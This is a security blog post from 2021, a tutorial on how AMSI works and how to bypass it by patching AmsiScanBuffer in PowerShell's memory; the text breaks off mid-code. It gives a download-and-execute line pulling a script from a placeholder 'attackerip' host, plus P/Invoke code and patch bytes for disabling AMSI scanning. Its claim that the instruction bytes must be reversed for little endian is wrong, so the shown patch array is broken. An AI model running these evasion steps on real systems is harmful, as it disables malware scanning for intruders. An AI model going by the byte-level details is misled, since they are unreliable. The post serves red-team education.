<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Defense Evasion Series Part 1 AMSI Bypass" /><meta name="author" content="Dazzy Ddos" /><meta property="og:locale" content="en_US" /><meta name="description" content="Introduction" /><meta property="og:description" content="Introduction" /><link rel="canonical" href="https://dazzyddos.github.io/posts/AMSI-Bypass/" /><meta property="og:url" content="https://dazzyddos.github.io/posts/AMSI-Bypass/" /><meta property="og:site_name" content="Dazzy Ddos" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-08-18T09:10:00+03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Defense Evasion Series Part 1 AMSI Bypass" /><meta name="twitter:site" content="@dazzyddos" /><meta name="twitter:creator" content="@Dazzy Ddos" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Dazzy Ddos"},"description":"Introduction","url":"https://dazzyddos.github.io/posts/AMSI-Bypass/","@type":"BlogPosting","headline":"Defense Evasion Series Part 1 AMSI Bypass","dateModified":"2021-08-18T11:53:33+03:00","datePublished":"2021-08-18T09:10:00+03:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://dazzyddos.github.io/posts/AMSI-Bypass/"},"@context":"https://schema.org"}</script><title>Defense Evasion Series Part 1 AMSI Bypass | Dazzy Ddos</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/25081660?s=460&u=d7eb9a459d672ab9b0b1ccead34de3233e2843ee&v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Dazzy Ddos</a></div><div class="site-subtitle font-italic"></div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/dazzyddos" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/dazzyddos" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Defense Evasion Series Part 1 AMSI Bypass</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Defense Evasion Series Part 1 AMSI Bypass</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Aug 18, 2021, 9:10 AM +0300" > Aug 18, 2021 <i class="unloaded">2021-08-18T09:10:00+03:00</i> </span> by <span class="author"> Dazzy Ddos </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Wed, Aug 18, 2021, 2:23 PM +0530" > Aug 18, 2021 <i class="unloaded">2021-08-18T11:53:33+03:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2079 words">11 min</span></div></div><div class="post-content"><h2 id="introduction">Introduction</h2><p>Hello Folks. This is the beginning of a new blog post series on various Defense Evasion techniques. In Part 1, we will look into what is AMSI, how it works and how to bypass it.</p><h2 id="prerequisites">Prerequisites</h2><p>Basic knowledge of <strong>powershell</strong>, <strong>assembly</strong>, <strong>Virtual Memory</strong>, <a href="https://frida.re/"><strong>Frida</strong></a>. In case you are not I would recommend you spend sometime to get little familiar with those topics.</p><h2 id="windows-program-execution-in-a-nutshell">Windows Program Execution in a nutshell</h2><p>Whenever a user double clicks a program or runs the program by other means, it’s the responsibility of the Windows <a href="https://en.wikipedia.org/wiki/Loader_(computing)">loader</a> to load and map the contents of the program in memory and then the execution is passed to the beginning of the code section.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/amsibypass/Pasted%20image%2020210812102609.png" alt="" /></p><p>For the windows loader to load the program successfully into the memory, the program(binary) must be present on the disk.</p><h2 id="detection-methods-in-av">Detection Methods in AV</h2><p>In the past AVs were not as smart as they are today. AVs would almost totally rely on signature based detection to determine if the content is malicious or not. AVs would only start their action as soon as some file is written on the disk or a new process is created (<strong>note</strong>: there are many more ways they would use to detect malware but these two were the most common ways to trigger AVs to start scanning). Now AVs are more smarter and the current detection methods include (This is not a comprehensive list but mostly seen):-</p><ul><li><p><strong>Signature Based Detection:</strong> It works by matching patterns/strings/signatures/hashes of those of a known malware from the database.</p><li><p><strong>Heuristic Based Detection:</strong> Similar to signature scanning, which detects threats by searching for specific strings, heuristic based detection looks for commands or instructions that would not be typically found in an application and has malicious intent.</p><li><p><strong>Behavioral Based Detection:</strong> This one might sound like the heuristic based one but it’s not. In this the Antivirus program looks for the events created by the program, for example if a program is trying to change or modify critical file/folder, if a program like word is spawning cmd.exe etc or if a program is calling a sequence of functions (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread) which might indicate potential process injection vector etc.</p><li><p><strong>Sandbox Detection:</strong> In this type of detection, the program is run in a sandbox(virualized environment) and it’s all behavior is recorded which is at the end analyzed automatically through a weight system in the sandbox and/or manually by a malware analyst. In this type of detection, the antivirus program will be able see in detail exactly what that file will do in that particular environment.</p></ul><p>Be it any detection method, it’s easier for any AV products to do it while the binary is on Disk. At-least it used to be the case before AMSI, it was hard for AV products to detect fileless malware(which doesn’t drop it’s artifacts on the disk and completely executes in the memory). Even as of today it’s the objective of most Adverseries and Red Teamers to not touch the disk or try to reduce it as much as possible cause it just reduces the likelihood of getting detected.</p><h2 id="invoke-expression">Invoke-Expression</h2><p>Powershell has a cmdlet i.e., <strong>Invoke-Expression</strong> which evaluates or runs the string passed to it completely in memory without storing it on disk. We can also verify it with the help of <strong>frida</strong>, you can also use APIMonitor here if you want. I will be remotely calling a simple powershell script that has a function which just prints the current date.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>
<span class="k">function </span>printDate <span class="o">{</span>
	get-date
<span class="o">}</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>Window 1

IEX<span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.downloadString<span class="o">(</span><span class="s1">'http://attackerip:8000/date.txt'</span><span class="o">)</span><span class="p">;</span> printDate
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>Window 2

frida-trace <span class="nt">-p</span> 10004 <span class="nt">-x</span> kernel32.dll <span class="nt">-i</span> Write<span class="k">*</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/amsibypass/Pasted%20image%2020210812160257.png" alt="" /></p><p>If the program has to write something to a file on disk, it will utilize the WriteFile or WriteFileEx API defined inside kernel32.dll. So here we are tracing all API calls which starts with ‘Write’ inside kernel32.dll. So we can clearly see that the IEX cmdlet doesn’t write the contenst to the disk, rather it executes the contents directly in memory. (<strong>Note</strong>: when you press up or down key, you will see a call to WriteFile API, that’s not called by IEX)</p><h2 id="introduction-to-amsi">Introduction to AMSI</h2><p>So for attackers and Red Teamers it was all going easy, days were good and there were no worries about getting detected. That’s when Microsoft introduce AMSI with the release of Windows 10. At a high level, think of AMSI like a bridge which connects powershell to the antivirus software, every command or script we run inside powershell is fetched by AMSI and sent to installed antivirus software for inspection.</p><p>Initially AMSI was introduced only for powershell and later it was also integrated into Jscript, VBScript, VBA and then very late was integrated into .NET with the introduction of .net framework 4.8</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/amsibypass/Pasted%20image%2020210812163113.png" alt="" /></p><center><b>source</b>: Microsoft</center><p>AMSI is not only restrcited to be used in Powershell, Jscript, VBScript or VBA, anyone can integrate AMSI with their programs using the API calls provided by AMSI Interface. The AMSI API calls that the program can use (in our case powershell) is defined inside amsi.dll. As soon as the powershell process has started, amsi.dll is loaded into it. We can verify it with <a href="https://processhacker.sourceforge.io/downloads.php"><strong>Process Hacker</strong></a></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/amsibypass/Pasted%20image%2020210812164212.png" alt="" /></p><p>AMSI exports the below mentioned API functions that the program uses to communicate with the local antivirus software through RPC.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/amsibypass/Pasted%20image%2020210814141704.png" alt="" /></p><ul><li><strong>AmsiInitialize:</strong> The program uses this method to initialize the AMSI session. It takes two parameters, one is the name of the application and second is the pointer to the context structure which needs to be specified with subsequent AMSI related API calls in the program.</ul><div class="language-markdown highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>HRESULT AmsiInitialize(
	LPCWSTR appName,
	HAMSICONTEXT <span class="err">*</span>amsiContext
);
</pre></table></code></div></div><ul><li><strong>AmsiOpenSession:</strong> It takes the context that was returned from the previous call and allows to switch to that session. We can instantiate multiple AMSI sessions if we want.</ul><div class="language-markdown highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>HRESULT AmsiOpenSession(
  HAMSICONTEXT amsiContext,
  HAMSISESSION <span class="err">*</span>amsiSession
);
</pre></table></code></div></div><ul><li><strong>AmsiScanString:</strong> This method does what exactly it sounds like. It takes our strings and returns the results i.e., 1 if the string is clean and 32768 if it’s malicious.</ul><div class="language-markdown highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>HRESULT AmsiScanString(
  HAMSICONTEXT amsiContext,
  LPCWSTR      string,
  LPCWSTR      contentName,
  HAMSISESSION amsiSession,
  AMSI_RESULT  <span class="err">*</span>result
);
</pre></table></code></div></div><ul><li><strong>AmsiScanBuffer:</strong> Similar to AmsiScanString, this method takes in the buffer instead of string and returns the result.</ul><div class="language-markdown highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>HRESULT AmsiScanBuffer(
  HAMSICONTEXT amsiContext,
  PVOID        buffer,
  ULONG        length,
  LPCWSTR      contentName,
  HAMSISESSION amsiSession,
  AMSI_RESULT  <span class="err">*</span>result
);
</pre></table></code></div></div><ul><li><strong>AmsiCloseSession:</strong> This method just closes the session that was opened by the program using the AmsiOpenSession.<div class="language-markdown highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>void AmsiCloseSession(
HAMSICONTEXT amsiContext,
HAMSISESSION amsiSession
);
</pre></table></code></div></div></ul><center><b>Source:</b> Microsoft Docs</center><p>Among these AMSI APIs, the one which is interesting to us is AmsiScanString and AmsiScanBuffer. AmsiScanString later calls AmsiScanBuffer underneath.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/amsibypass/Pasted%20image%2020210816092128.png" alt="" /></p><h2 id="bypassing-amsi">Bypassing AMSI</h2><p>The two most commonly used method for bypassing AMSI is obfuscation and Patching amsi.dll in memory.</p><p>As all what AMSI does it passes the content to the AV to determine if it’s malicious or not, so if the content is obfuscated, there’s no way for the AV to tell if it’s malicious.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/amsibypass/Pasted%20image%2020210814150019.png" alt="" /></p><p>If we can strip or obfuscate the words in our script that gets detected by the AV, we can pretty much run any script without being detected but it’s not feasible to obfuscate or strip all detected words as it takes more time or might even break the script, even AV keeps updating it’s signature, so we got to keep updating our script accordingly.</p><p>So, it’s not seeming feasible to obfuscate as every AV vendors might have different signatures and it keeps updating. The other mostly used AMSI bypassing is by patching the AmsiScanBuffer function as the amsi.dll library is loaded in the same virtual memory space of the process, so we have pretty much full control in that address space. Let’s see the AMSI API calls made by powershell with the help of Frida.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/amsibypass/Pasted%20image%2020210816093016.png" alt="" /></p><p>Above we are tracing all the AMSI API calls made by powershell. We can’t see the arguments passed to the function nor the results returned by the AMSI scan. When we first start frida session, it creates handler files, we can modify those file to print the arguments and results at runtime.</p><div class="language-markdown highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>C:<span class="se">\U</span>sers<span class="se">\U</span>ser<span class="se">\_</span><span class="ge">_handlers_</span>_<span class="se">\a</span>msi.dll<span class="se">\A</span>msiScanBuffer.js
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/amsibypass/Pasted%20image%2020210816093957.png" alt="" /></p><p>Above we modified the handler file to print the arguments to the APIs when they are called and print the result on exit.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/amsibypass/Pasted%20image%2020210816094423.png" alt="" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/amsibypass/Pasted%20image%2020210816094758.png" alt="" /></p><p>AmsiScanBuffer returns result 1 when the input is clean and 32768 when the input is found to be malicious.</p><p>Let’s look into the AmsiScanBuffer function in more detail inside Disassembler (I’m using IDA here).</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/amsibypass/Pasted%20image%2020210816100211.png" alt="" /></p><p>The actual scanning is performed by the instructions in the left box. The instructions at right is called whenever the arguments passed by the caller is not valid, 80070057h corresponds to <code class="language-plaintext highlighter-rouge">E_INVALIDARG</code>. And then the function ends.</p><p>So we can patch the beginning of AmsiScanBuffer() with the instructions in right box i.e., mov eax, 80070057h; ret. So that whenever AmsiScanBuffer() is called, it returns with the error code instead of performing the actual AMSI Scan. The byte that corresponds to that instruction is <code class="language-plaintext highlighter-rouge">b85700780</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/amsibypass/Pasted%20image%2020210816103917.png" alt="" /></p><p>We need to modify the beginning of AmsiScanBuffer with</p><div class="language-markdown highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>b857000780       mov eax, 80070057h
c3			     ret
</pre></table></code></div></div><p>The bytes that correspond to the above instructions is <code class="language-plaintext highlighter-rouge">b857000780c3</code></p><p>We need to reverse the bytes because of little endian architecture.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/amsibypass/Pasted%20image%2020210816105424.png" alt="" /></p><p>As can be seen, now the very first instruction of AmsiScanBuffer has been overwritten.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/amsibypass/Pasted%20image%2020210816105705.png" alt="" /></p><p>As can be seen, now the result is 0 and AMSI is not triggered when we passed “Invoke-Mimikatz” string in powershell.</p><p>We took the help of WinDBG to patch the AmsiScanBuffer function. Many times in real world scenarios we might not have GUI access with windbg or any debugger with privileges to run it. So, there should be some way to programatically patch the functions without using any Debugger, luckily Microsoft has provided several document APIs to interact with it’s platform and various services. We will be leveraging the below Windows APIs to programatically patch the AmsiScanBuffer().</p><ul><li><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya"><strong>LoadLibrary:</strong></a> To load amsi.dll library in the address space.</p><li><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress"><strong>GetProcAddress:</strong></a> To retrieve the address of AmsiScanBuffer.</p><li><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect"><strong>VirtualProtect:</strong></a> To make the address region writable as by default it’s RX. We need to make it writable as well so that we can overwrite the instructions and later we’ll again make it to RX from RWX.</p></ul><p>To make use of these API calls in powershell, we will first define the methods in C# using pinvoke (which allows us to call unmanaged APIs in managed code) and then load the c# into the powershell session using add-type.</p><div class="language-c# highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="err">$</span><span class="n">code</span> <span class="p">=</span> <span class="s">@"
using System;
using System.Runtime.InteropServices;

public class WinApi {
	
	[DllImport("</span><span class="n">kernel32</span><span class="s">")]
</span>	<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">LoadLibrary</span><span class="p">(</span><span class="kt">string</span> <span class="n">name</span><span class="p">);</span>
	
	<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32"</span><span class="p">)]</span>
	<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">GetProcAddress</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hModule</span><span class="p">,</span> <span class="kt">string</span> <span class="n">procName</span><span class="p">);</span>
	
	<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32"</span><span class="p">)]</span>
	<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="nf">VirtualProtect</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="n">UIntPtr</span> <span class="n">dwSize</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">flNewProtect</span><span class="p">,</span> <span class="k">out</span> <span class="kt">int</span> <span class="n">lpflOldProtect</span><span class="p">);</span>
	
<span class="p">}</span><span class="s">"@
</span></pre></table></code></div></div><p>In the above code, we are first loading the required namespaces. <code class="language-plaintext highlighter-rouge">System.Runtime.InteropServices</code> is where pinvoke implemented. Then we are defining the signature for each native API, I have taken them from pinvoke.net. We need to load the above C# code inside powershell session using Add-Type.</p><div class="language-c# highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Add</span><span class="p">-</span><span class="n">Type</span> <span class="err">$</span><span class="n">code</span>
</pre></table></code></div></div><p>Now we can use those API calls from inside powershell session.</p><div class="language-c# highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="err">$</span><span class="n">amsiDll</span> <span class="p">=</span> <span class="p">[</span><span class="n">WinApi</span><span class="p">]::</span><span class="nf">LoadLibrary</span><span class="p">(</span><span class="s">"amsi.dll"</span><span class="p">)</span>
<span class="err">$</span><span class="n">asbAddr</span> <span class="p">=</span> <span class="p">[</span><span class="n">WinApi</span><span class="p">]::</span><span class="nf">GetProcAddress</span><span class="p">(</span><span class="err">$</span><span class="n">amsiDll</span><span class="p">,</span> <span class="s">"Ams"</span><span class="p">+</span><span class="s">"iScan"</span><span class="p">+</span><span class="s">"Buf"</span><span class="p">+</span><span class="s">"fer"</span><span class="p">)</span>
<span class="err">$</span><span class="n">ret</span> <span class="p">=</span> <span class="p">[</span><span class="n">Byte</span><span class="p">[]]</span> <span class="p">(</span> <span class="m">0xc3</span><span class="p">,</span> <span class="m">0x80</span><span class="p">,</span> <span class="m">0x07</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span><span class="m">0x57</span><span class="p">,</span> <span class="m">0xb8</span> <span class="p">)</span>
